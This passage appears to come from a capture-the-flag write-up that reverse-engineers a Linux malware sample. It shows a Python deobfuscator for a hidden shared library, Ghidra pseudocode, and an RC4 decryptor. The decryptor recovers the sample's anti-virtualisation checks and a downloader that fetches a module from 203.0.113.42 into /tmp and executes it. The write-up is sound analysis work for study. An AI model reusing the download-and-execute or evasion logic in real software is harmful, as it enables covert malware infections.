  0x00023648 6f6e6720 75732070 72657465 6e647320 ong us pretends 
  0x00023658 746f2075 6e646572 7374616e 64204269 to understand Bi
  0x00023668 67204f20 6e6f7461 74696f6e 2e205468 g O notation. Th
  0x00023678 69732073 7072696e 7420706c 616e6e69 is sprint planni
  0x00023688 6e672077 61732073 74726169 67687420 ng was straight 
  0x00023698 75702067 6976696e 67206d61 696e2063 up giving main c
  0x000236a8 68617261 63746572 20656e65 72677920 haracter energy 
  0x000236b8 62757420 6d616b65 20697420 66756c6c but make it full
  0x000236c8 2d737461 636b2c20 70657269 6f647420 -stack, periodt 
  0x000236d8 6e6f2070 72696e74 65722064 65746563 no printer detec
  0x000236e8 7465642c 20736b69 62696469 20626f70 ted, skibidi bop
  0x000236f8 20626f70 206e706d 20696e73 74616c6c  bop npm install
  0x00023708 20796573 20796573 2e0a               yes yes..
```

`.init.constructors.global` appears to be some sort of obfuscated content

```
readelf -x .init.constructors.global ./suspicious
```

It is very long so the below is just a short snippet

```
Hex dump of section '.init.constructors.global':
  0x000230a0 21b5cd04 665c2aaa dadf23f5 b6d15421 !...f\*...#...T!
  0x000230b0 2b8474f1 31e396f4 f17c7b07 003d7568 +.t.1....|{..=uh
  0x000230c0 c82cff67 622eb2f5 82f16859 074d4f21 .,.gb.....hY.MO!
  0x000230d0 0ca8a960 c2724c4d c28108dd 496bde3f ...`.rLM....Ik.?
  0x000230e0 3139d048 723df3aa d4dd59c4 57ea3cf9 19.Hr=....Y.W.<.
  0x000230f0 464bbfe0 c60ba6a9 fc93d12a edea1dd6 FK.........*....
  0x00023100 918e93d9 9e66ec03 ce9ea256 bda3f456 .....f.....V...V
  0x00023110 4795b59d 5c0911cd c9015520 95213ce3 G...\.....U .!<.
  0x00023120 467a2d37 32d1aeec 11bb2789 4c9311e0 Fz-72.....'.L...
  0x00023130 544ebb04 fea5516c bd324fb9 5ca411f9 TN....Ql.2O.\...
  0x00023140 58fda499 66dde528 2a951edd 9dd5f943 X...f..(*......C
  0x00023150 bc5c734a 5c2f0e6b d069cf20 bdd9316b .\sJ\/.k.i. ..1k
  0x00023160 f53336fa 76c848c3 47917579 cba3cb3b .36.v.H.G.uy...;
  0x00023170 b9d2bc20 85cce914 e4c9359a 6eb54f10 ... ......5.n.O.
  0x00023180 893b0177 ae45b34b 2c69b5c9 7796c152 .;.w.E.K,i..w..R
  0x00023190 cf15fda6 40968fcb 34d82680 cac13c0c ....@...4.&...<.
  0x000231a0 9d13087a 408a9761 8c6e1e75 1f47fc55 ...z@..a.n.u.G.U
...
...
...
A lot more stuff after
...
...
...
```

It appears the actual malware payload is obfuscated and hidden within this binary in its program sections! A binary hidden in a binary. 

This looks very similar to the obfuscated blobs we have already deobfuscated thus far. We need to use the brainrot string as a key to deobfuscate the obfuscated data. 

Said obfuscated data in this case will be zlib compressed, so we have to decompress it. 

Then, if everything worked as intended, we should end up with some sort of executable, or a shared library. 

We can write a Python script to attempt to do exactly this


```python
#!/usr/bin/env python3
import zlib
from pathlib import Path

KEYPATH = "out.bin"
BUFPATH = "init_constructors_global.bin"
OUT_PREFIX = "mimic"

def load():
    key = Path(KEYPATH).read_bytes()
    buf = bytearray(Path(BUFPATH).read_bytes())
    return key, buf

def malware_deobf_like(buf, key, param2, param4, start_key_offset=0):
    """
    Implements the Ghidra pseudocode:
      for uVar1 from 0; if param4 != 1 then
        buf[uVar1] ^= *(param1 + (uVar1 % (param2 - 1)))
        uVar1++
      while (param4 - 1 != uVar1)
    Number of XOR ops = param4 - 1 (unless param4 == 1 -> none)
    param2 is the value passed as second arg (used as param2 - 1 in modulus).
    """
    out = bytearray(buf)  # copy
    if param4 == 1:
        return out
    keylen = len(key)
    mod = param2 - 1
    # protect against mod == 0; Ghidra code would use modulo with (param_2 -1U) which would be UB if zero,
    # but we'll treat mod==0 as index 0 (safe fallback)
    i = 0
    while True:
        if i >= len(out):
            break
        idx = (i % mod) if mod != 0 else 0
        key_idx = (start_key_offset + idx) % keylen
        out[i] ^= key[key_idx]
        i += 1
        if i == (param4 - 1):
            break
    return out

def try_decompress_all(blob, label):
    # try several wbits
    for wbits, name in ((15, "zlib"), (-15, "raw"), (31, "gzip")):
        try:
            dec = zlib.decompress(blob, wbits)
            Path(f"{OUT_PREFIX}_{label}_{name}.bin").write_bytes(dec)
            print("SUCCESS:", label, name, "-> wrote", f"{OUT_PREFIX}_{label}_{name}.bin", "size", len(dec))
            return True
        except Exception as e:
            pass
    # try streaming to collect partial output/error
    try:
        d = zlib.decompressobj()
        out = d.decompress(blob)
        out += d.flush()
        Path(f"{OUT_PREFIX}_{label}_stream.bin").write_bytes(out)
        print("STREAM success (no exception), wrote", f"{OUT_PREFIX}_{label}_stream.bin", "size", len(out))
        return True
    except zlib.error as e:
        # write partial output for inspection
        try:
            d = zlib.decompressobj()
            _ = d.decompress(blob)
            partial = d.flush()
        except Exception:
            partial = b""
        Path(f"{OUT_PREFIX}_{label}_partial.bin").write_bytes(partial)
        print("Decompress failed for", label, "error:", e, "wrote partial of", len(partial))
    return False

def main():
    key, buf = load()
    print("key len", len(key), "buf len", len(buf))

    # Reasonable param2/param4 candidates to try
    # param2 might be len(key), len(key)+1, or len(key)-1 (if stored length includes terminator)
    # param4 might be len(buf), len(buf)+1, len(buf)-1
    param2_candidates = [len(key), len(key)-1 if len(key)>1 else 1, len(key)+1]
    param4_candidates = [len(buf), max(1, len(buf)-1), len(buf)+1]

    tried = 0
    for p2 in param2_candidates:
        for p4 in param4_candidates:
            tried += 1
            label = f"p2{p2}_p4{p4}"
            print("Trying", label)
            cand = malware_deobf_like(buf, key, param2=p2, param4=p4, start_key_offset=0)
            # quick ELF check
            if cand.startswith(b"\x7fELF"):
                print("  -> ELF magic at start for", label)
                Path(f"{OUT_PREFIX}_{label}_elf.bin").write_bytes(cand)
            # try decompress
            try_decompress_all(bytes(cand), label)
    print("Tried", tried, "variants. Check output files.")

if __name__ == "__main__":
    main()
```

To preface, I had dumped the output of the brainrot string into a file called `out.bin` and the content of the obfuscated data into a file called `"init_constructors_global.bin"`. I am also using "mimic" as my prefix since we are attempting to mimic the malware

Additionally, from my comments, you can see that I tried to copy the Ghidra dissassembly version of the same deobfuscation function that we already made. I was having issues when emulating Binja's version. 

The above script also attempts to decompress multiple times / ways just to make sure we're not off offset wise or whatnot. 

Running this successfully gets us something

```
key len 1658 buf len 16785
Trying p21658_p416785
SUCCESS: p21658_p416785 zlib -> wrote mimic_p21658_p416785_zlib.bin size 52968
```

We can run `file` on this output 

```
file mimic_p21658_p416785_zlib.bin
```

We do successfully get what appears to be a shared library!

```
mimic_p21658_p416785_zlib.bin: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=20d296cb481406379a05edef27676cd611430bf1, stripped
```

Onward to more analysis!

#### Rev Part 2. Electric Boogaloo

On this new binary, I use Ghidra for my analysis

Remember, from the loading logic we saw earlier, if the malware payload was a shared library, it would try to execute a function named `run`

Well, we found `run`

```c
void run(void)

{
  bool bVar1;
  char cVar2;
  long in_FS_OFFSET;
  undefined rc4_decrypt [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  rc4_ksa(rc4_decrypt,"skibidi",7);
  cVar2 = check_path_exists(rc4_decrypt);
  if (cVar2 == '\x01') {
    cVar2 = check_env_var_exists(rc4_decrypt);
    if (cVar2 == '\x01') {
      cVar2 = is_year_2024();
      if (cVar2 == '\x01') {
        cVar2 = is_root();
        if (cVar2 == '\x01') {
          cVar2 = file_contains_required_strings(rc4_decrypt);
          if (cVar2 == '\x01') {
            cVar2 = run_command_and_check_output(rc4_decrypt);
            if (cVar2 == '\x01') {
              bVar1 = false;
              goto LAB_00108e1d;
            }
          }
        }
      }
    }
  }
  bVar1 = true;
LAB_00108e1d:
  if (!bVar1) {
    download_and_execute_plugin(rc4_decrypt);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

From my renamed function names, we can see what this function is doing

As a note, [RC4](https://en.wikipedia.org/wiki/RC4) is a keystream cipher. It encrypts/decrypts data byte-by-byte by XORing it with a pseudorandom keystream

It initializes an RC4 internal state using `skibidi` as the key, preparing it to generate a keystream

```c
rc4_ksa(rc4_decrypt,"skibidi",7);
```

```c

void rc4_ksa(long param_1,long param_2,ulong param_3)

{
  int local_14;
  int i;
  int j;
  
  for (i = 0; i < 0x100; i = i + 1) {
    *(char *)(param_1 + i) = (char)i;
  }
  local_14 = 0;
  for (j = 0; j < 0x100; j = j + 1) {
    local_14 = (int)((uint)*(byte *)(param_1 + j) + local_14 +
                    (uint)*(byte *)(param_2 + (ulong)(long)j % param_3)) % 0x100;
    std::swap<>((uchar *)(param_1 + j),(uchar *)(local_14 + param_1));
  }
  *(undefined4 *)(param_1 + 0x100) = 0;
  *(undefined4 *)(param_1 + 0x104) = 0;
  return;
}
```

It uses this keystream to decrypt a bunch of encrypted `DATS` in the binary. These `DATS` likely hold data that is sensitive for the binary, hence why it is encrypted. There are a couple `DATS` used in the check functions that are used to see if conditions are right for the malware to execute. You can see what exactly these checks are doing based on what I named the functions. I won't paste them here since they aren't that important. 


```c
  cVar2 = check_env_var_exists(rc4_decrypt);
    if (cVar2 == '\x01') {
      cVar2 = is_year_2024();
      if (cVar2 == '\x01') {
        cVar2 = is_root();
        if (cVar2 == '\x01') {
          cVar2 = file_contains_required_strings(rc4_decrypt);
          if (cVar2 == '\x01') {
            cVar2 = run_command_and_check_output(rc4_decrypt);
            if (cVar2 == '\x01') {
              bVar1 = false;
              goto LAB_00108e1d;
            }
```

The most important `DATS` appear to be used in this function

```c
  if (!bVar1) {
    download_and_execute_plugin(rc4_decrypt);
  }
```

Which as my name suggests, downloads and executes some kind of plugin

```c

bool download_and_execute_plugin(undefined8 param_1)

{
  char cVar1;
  uint16_t uVar2;
  int __fd;
  int iVar3;
  char *__cp;
  size_t __n;
  void *__buf;
  ssize_t sVar4;
  undefined8 uVar5;
  long lVar6;
  code *pcVar7;
  long in_FS_OFFSET;
  bool bVar8;
  sockaddr local_788;
  basic_string<> local_778 [32];
  basic_string<> local_758 [32];
  basic_string local_738 [32];
  basic_string<> local_718 [32];
  basic_string<> local_6f8 [32];
  basic_string local_6d8 [32];
  basic_string<> local_6b8 [32];
  Comms local_698 [112];
  basic_string local_628 [248];
  basic_ios<> abStack_530 [264];
  undefined local_428 [1032];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  __fd = socket(2,1,0);
  if (__fd < 0) {
    bVar8 = false;
  }
  else {
    assemble_path_helper(local_778,&DAT_0010d618,0xc,param_1);
    local_788.sa_data[6] = '\0';
    local_788.sa_data[7] = '\0';
    local_788.sa_data[8] = '\0';
    local_788.sa_data[9] = '\0';
    local_788.sa_data[10] = '\0';
    local_788.sa_data[11] = '\0';
    local_788.sa_data[12] = '\0';
    local_788.sa_data[13] = '\0';
    local_788.sa_family = 2;
    local_788.sa_data[0] = '\0';
    local_788.sa_data[1] = '\0';
    local_788.sa_data[2] = '\0';
    local_788.sa_data[3] = '\0';
    local_788.sa_data[4] = '\0';
    local_788.sa_data[5] = '\0';
    uVar2 = htons(0x1f90);
    local_788.sa_data._0_2_ = uVar2;
    __cp = (char *)std::__cxx11::basic_string<>::c_str();
    iVar3 = inet_pton(2,__cp,local_788.sa_data + 2);
    if (iVar3 < 1) {
                    /* try { // try from 00108043 to 001080b0 has its CatchHandler @ 00108534 */
      close(__fd);
      bVar8 = false;
    }
    else {
      iVar3 = connect(__fd,&local_788,0x10);
      if (iVar3 < 0) {
        close(__fd);
        bVar8 = false;
      }
      else {
        assemble_path_helper(local_758,&DAT_0010d630,0x14,param_1);
                    /* try { // try from 001080cc to 00108156 has its CatchHandler @ 0010851c */
        std::operator+(local_628,(char *)local_758);
        std::__cxx11::basic_string<>::operator=(local_758,local_628);
        std::__cxx11::basic_string<>::~basic_string((basic_string<> *)local_628);
        __n = std::__cxx11::basic_string<>::length();
        __buf = (void *)std::__cxx11::basic_string<>::c_str();
        send(__fd,__buf,__n,0);
        assemble_path_helper(local_738,&DAT_0010d644,5,param_1);
                    /* try { // try from 00108177 to 0010817b has its CatchHandler @ 00108504 */
        assemble_path_helper(local_718,&DAT_0010d649,1,param_1);
                    /* try { // try from 0010819c to 001081a0 has its CatchHandler @ 001084ec */
        assemble_path_helper(local_6f8,&DAT_0010d650,0x10,param_1);
                    /* try { // try from 001081bc to 001081c0 has its CatchHandler @ 001084d4 */
        std::operator+(local_628,local_738);
                    /* try { // try from 001081dc to 001081e0 has its CatchHandler @ 0010845c */
        std::operator+(local_6d8,local_628);
        std::__cxx11::basic_string<>::~basic_string((basic_string<> *)local_628);
                    /* try { // try from 00108209 to 0010820d has its CatchHandler @ 001084bc */
        std::basic_ofstream<>::basic_ofstream(local_628,(_Ios_Openmode)local_6d8);
                    /* try { // try from 0010821e to 00108339 has its CatchHandler @ 001084a4 */
        cVar1 = std::basic_ios<>::operator!(abStack_530);
        if (cVar1 == '\0') {
          while( true ) {
            sVar4 = recv(__fd,local_428,0x400,0);
            if (sVar4 < 1) break;
            std::basic_ostream<>::write((char *)local_628,(long)local_428);
          }
          if (sVar4 < 0) {
            std::basic_ofstream<>::close();
            close(__fd);
            bVar8 = false;
          }
          else {
            std::basic_ofstream<>::close();
            close(__fd);
            uVar5 = std::__cxx11::basic_string<>::c_str();
            lVar6 = dlopen(uVar5,0x102);
            if (lVar6 == 0) {
              bVar8 = false;
            }
            else {
              assemble_path_helper(local_6b8,&DAT_0010d660,0xe,param_1);
              uVar5 = std::__cxx11::basic_string<>::c_str();
              pcVar7 = (code *)dlsym(lVar6,uVar5);
              bVar8 = pcVar7 != (code *)0x0;
              if (bVar8) {
                    /* try { // try from 0010838f to 00108393 has its CatchHandler @ 0010848c */
                Comms::Comms(local_698);
                    /* try { // try from 001083a5 to 001083a6 has its CatchHandler @ 00108474 */
                (*pcVar7)(local_698);
                dlclose(lVar6);
                Comms::~Comms(local_698);
              }
              else {
                dlclose(lVar6);
              }
              std::__cxx11::basic_string<>::~basic_string(local_6b8);
            }
          }
        }
        else {
          close(__fd);
          bVar8 = false;
        }
        std::basic_ofstream<>::~basic_ofstream((basic_ofstream<> *)local_628);
        std::__cxx11::basic_string<>::~basic_string((basic_string<> *)local_6d8);
        std::__cxx11::basic_string<>::~basic_string(local_6f8);
        std::__cxx11::basic_string<>::~basic_string(local_718);
        std::__cxx11::basic_string<>::~basic_string((basic_string<> *)local_738);
        std::__cxx11::basic_string<>::~basic_string(local_758);
      }
    }
    std::__cxx11::basic_string<>::~basic_string(local_778);
  }
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return bVar8;
}
```

There are a lot of `DATS` here, so the binary definitely wants to hide whatever these `DATS` decrypt to

Let's walk through what this function appears to be doing

It makes some kind of connection with socket programming with the IP it is connecting to being encrypted in `DAT_0010d618`

```c
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  __fd = socket(2,1,0);
  if (__fd < 0) {
    bVar8 = false;
  }
  else {
    assemble_path_helper(local_778,&DAT_0010d618,0xc,param_1);
    local_788.sa_data[6] = '\0';
    local_788.sa_data[7] = '\0';
    local_788.sa_data[8] = '\0';
    local_788.sa_data[9] = '\0';
    local_788.sa_data[10] = '\0';
    local_788.sa_data[11] = '\0';
    local_788.sa_data[12] = '\0';
    local_788.sa_data[13] = '\0';
    local_788.sa_family = 2;
    local_788.sa_data[0] = '\0';
    local_788.sa_data[1] = '\0';
    local_788.sa_data[2] = '\0';
    local_788.sa_data[3] = '\0';
    local_788.sa_data[4] = '\0';
    local_788.sa_data[5] = '\0';
    uVar2 = htons(0x1f90);
    local_788.sa_data._0_2_ = uVar2;
    __cp = (char *)std::__cxx11::basic_string<>::c_str();
    iVar3 = inet_pton(2,__cp,local_788.sa_data + 2);
    if (iVar3 < 1) {
                    /* try { // try from 00108043 to 001080b0 has its CatchHandler @ 00108534 */
      close(__fd);
      bVar8 = false;
    }
    else {
      iVar3 = connect(__fd,&local_788,0x10);
      if (iVar3 < 0) {
        close(__fd);
        bVar8 = false;
      }
```

As we can see from my function renaming, I found a function that appears to be used to assemble a string or file path. I call this `assemble_path_helper`, which it uses to decrypt what is in the `DAT` and assemble some string or path with it. In this case, it is assembling an IP address most likely

For the next part, which is essentially the rest of the function, it sends some kind of request, recieves the response, writes the contents to some sort of file, with the file path being assembled with the below lines

```c
assemble_path_helper(local_738,&DAT_0010d644,5,param_1);
            /* try { // try from 00108177 to 0010817b has its CatchHandler @ 00108504 */
assemble_path_helper(local_718,&DAT_0010d649,1,param_1);
            /* try { // try from 0010819c to 001081a0 has its CatchHandler @ 001084ec */
assemble_path_helper(local_6f8,&DAT_0010d650,0x10,param_1);
```

It then dynamically loads the file (which means it is expecting to download a shared library) and executes a function

Again, a lot of the important details (like what the IP is, what request was sent, the file name, what function was executed, etc) is encrypted. 

What we really want is that file name, since the goal of this task is to find the "file path the malware uses to write a file"

We can mimic this decryption logic with Python, but we have to decrypt each `DAT` in order starting with the very first `DAT`, since that's how the RC4 algorithm works. 

```python

# Decrypt all DAT blobs in the exact runtime order shown in the malware's run() -> download flow.
# KSA runs once (key "skibidi"), PRGA output is consumed sequentially across DATs.
# Prints UTF-8 (if plausible), printable fallback, and hex. Also tries IPv4 interpretations.

from typing import List, Tuple
import socket, struct, re

KEY = b"skibidi"

# === DAT blobs here in the exact runtime order ===
# 1) check_path_exists -> DAT_0010d580
DAT_0010d580 = bytes([
    0xC7,0x16,0x75,0xC6,0x0F,0xC7,0x14,0x36,0x16,0xAF,0x4C,0x1D,0x34,0x01,0x41,0xBA,
    0xF9,0x22,0xB9,0xAC,0x42,0xA6,0xC7,0x07,0x00,0x09,0xF7,0x59,0xC9,0xE1,0x2E,0x63,
    0x77,0xF3,0xA0,0x71,0xDB,0x1F
])

# 2) check_env_var -> DAT_0010d5b0
DAT_0010d5b0 = bytes([
    0xD2,0x38,0xBD,0x57,0x18,0x9E,0xC1,0x37,0x5A,0xC9,0xB7,0xBF,0x93,0xDA,0xD3,0x4B,0xA4
])

# 3) file_contains_required_strings -> DAT_0010d5c8, DAT_0010d5d5, DAT_0010d5e0
DAT_0010d5c8 = bytes([0xD5,0x62,0xFB,0x65,0x4A,0x1A,0x46,0x03,0xBC,0xF4,0xAE,0x73,0x9E])
DAT_0010d5d5 = bytes([0xB4,0xB2,0xE4,0x8E,0x6D])
DAT_0010d5e0 = bytes([0x78,0xC8,0x50,0xA5,0x17,0x82,0x7A,0xFD,0xBB,0x88])

# 4) run_command_and_check_output -> DAT_0010d5f0, DAT_0010d60f, DAT_0010d610
DAT_0010d5f0 = bytes([0xF3,0x29,0x27,0xC9,0x62,0x3A,0x59,0x45,0x15,0x5F,0xBD,0xD9,0x75,0x84,0x79,0x7A,0x5F,0xAC,0x1E,0xA3,0x30,0x15,0x0C,0xFA,0x87,0x0C,0xC6,0x3A,0x26,0xD9,0x8B])
DAT_0010d60f = bytes([0x39])  # single byte '9' blob
DAT_0010d610 = bytes([0x4D,0x54,0x26,0x35])  # "MT&5" maybe part of the search string

# 5) download_and_execute_plugin -> DAT_0010d618, DAT_0010d630, DAT_0010d644, DAT_0010d649, DAT_0010d650
DAT_0010d618 = bytes([0x53,0xD9,0xC6,0xD8,0x09,0x82,0x27,0xCF,0xA1,0xDE,0x17,0x8A])
DAT_0010d630 = bytes([0xD2,0x20,0x8A,0x73,0x75,0x62,0xCB,0x5B,0xB5,0x65,0xDA,0x5F,0x74,0xB1,0xB5,0x4A,0x19,0x7D,0x57,0x92])
DAT_0010d644 = bytes([0x10,0xDB,0xF5,0x06,0x99])
DAT_0010d649 = bytes([0xC4])
DAT_0010d650 = bytes([0x44,0x14,0x7D,0x91,0xBD,0x05,0x5B,0xF5,0x64,0x56,0x4D,0x3E,0x33,0x37,0xBF,0x95])
DAT_0010d660 = bytes([
    0x5c, 0xf8, 0x80, 0x3d, 0xc8, 0x84, 0xfc, 0x82,
    0x5a, 0xaa, 0x1b, 0x13, 0x9c, 0xb2
])


ALL_DATS_ORDERED: List[Tuple[str, bytes]] = [
    ("DAT_0010d580", DAT_0010d580),
    ("DAT_0010d5b0", DAT_0010d5b0),
    ("DAT_0010d5c8", DAT_0010d5c8),
    ("DAT_0010d5d5", DAT_0010d5d5),
    ("DAT_0010d5e0", DAT_0010d5e0),
    ("DAT_0010d5f0", DAT_0010d5f0),
    ("DAT_0010d60f", DAT_0010d60f),
    ("DAT_0010d610", DAT_0010d610),
    ("DAT_0010d618", DAT_0010d618),
    ("DAT_0010d630", DAT_0010d630),
    ("DAT_0010d644", DAT_0010d644),
    ("DAT_0010d649", DAT_0010d649),
    ("DAT_0010d650", DAT_0010d650),
    ("DAT_0010d660", DAT_0010d660),
]

# === RC4 helpers ===
def rc4_ksa(key: bytes) -> List[int]:
    S = list(range(256))
    j = 0
    klen = len(key)
    if klen == 0:
        raise ValueError("empty key")
    for i in range(256):
        j = (j + S[i] + key[i % klen]) & 0xff
        S[i], S[j] = S[j], S[i]
    return S

def prga_generator(S: List[int]):
    i = 0
    j = 0
    while True:
        i = (i + 1) & 0xff
        j = (j + S[i]) & 0xff
        S[i], S[j] = S[j], S[i]
        yield S[(S[i] + S[j]) & 0xff]

# helpers to display
def printable_fallback(b: bytes) -> str:
    return ''.join(chr(x) if 32 <= x < 127 else '.' for x in b)

def looks_like_ipv4_text(b: bytes) -> bool:
    try:
        s = b.decode('ascii')
    except Exception:
        return False
    return re.fullmatch(r'(25[0-5]|2[0-4]\d|1?\d?\d)(\.(25[0-5]|2[0-4]\d|1?\d?\d)){3}', s) is not None

def try_packed_ipv4(b: bytes):
    res = []
    for off in range(max(1, len(b)-3)):
        part = b[off:off+4]
        if len(part) < 4:
            continue
        ip = socket.inet_ntoa(part)
        res.append((off, ip))
    return res

# decrypt sequence
def decrypt_sequence(blobs):
    S = rc4_ksa(KEY)
    gen = prga_generator(S)
    results = []
    for name, blob in blobs:
        out = bytes(b ^ next(gen) for b in blob)
        results.append((name, out))
    return results

if __name__ == "__main__":
    res = decrypt_sequence(ALL_DATS_ORDERED)
    for name, data in res:
        print("----", name, "len=", len(data))
        # try UTF-8
        try:
            s = data.decode('utf-8')
            print("UTF-8:", s)
        except Exception:
            print("printable:", printable_fallback(data))
        print("hex:", data.hex())
        # special attempts
        if name == "DAT_0010d618":
            if looks_like_ipv4_text(data):
                print("-> Looks like ASCII IPv4:", data.decode('ascii'))
            else:
                packed = try_packed_ipv4(data)
                if packed:
                    print("-> Possible packed IPv4 candidates (offset, ip):", packed)
        print()
```

In my above Python code, I explicitly state which function (remember I renamed them but you can check the before pasted `main` code for reference) each `DAT` comes from

Running the above script gets us:

```
UTF-8: /opt/dafin/intel/ops_brief_redteam.pdf
hex: 2f6f70742f646166696e2f696e74656c2f6f70735f62726965665f7265647465616d2e706466

---- DAT_0010d5b0 len= 17
UTF-8: DAFIN_SEC_PROFILE
hex: 444146494e5f5345435f50524f46494c45

---- DAT_0010d5c8 len= 13
UTF-8: /proc/cpuinfo
hex: 2f70726f632f637075696e666f

---- DAT_0010d5d5 len= 5
UTF-8: flags
hex: 666c616773

---- DAT_0010d5e0 len= 10
UTF-8: hypervisor
hex: 68797065727669736f72

---- DAT_0010d5f0 len= 31
UTF-8: systemd-detect-virt 2>/dev/null
hex: 73797374656d642d6465746563742d7669727420323e2f6465762f6e756c6c

---- DAT_0010d60f len= 1
UTF-8: r
hex: 72

---- DAT_0010d610 len= 4
UTF-8: none
hex: 6e6f6e65

---- DAT_0010d618 len= 12
UTF-8: 203.0.113.42
hex: 3230332e302e3131332e3432
-> Looks like ASCII IPv4: 203.0.113.42

---- DAT_0010d630 len= 20
UTF-8: GET /module HTTP/1.1
hex: 474554202f6d6f64756c6520485454502f312e31

---- DAT_0010d644 len= 5
UTF-8: /tmp/
hex: 2f746d702f

---- DAT_0010d649 len= 1
UTF-8: .
hex: 2e

---- DAT_0010d650 len= 16
UTF-8: dbBY1cfp0bCosNlL
hex: 64624259316366703062436f734e6c4c

---- DAT_0010d660 len= 14
UTF-8: execute_module
hex: 657865637574655f6d6f64756c65
```

Looks like the IP was `203.0.113.42`, the request it sent was `GET /module HTTP/1.1`, the function it executes is `execute_module`, and most importantly for us, the file path it writes a file to appears to be `/tmp/./dbBY1cfp0bCosNlL`

Sure enough, submitting `/tmp/./dbBY1cfp0bCosNlL` solves this task!

This was a really fun challenge, and was definitely my favorite of the 7

**Response:**
> Superb work unpacking and analyzing that Malware!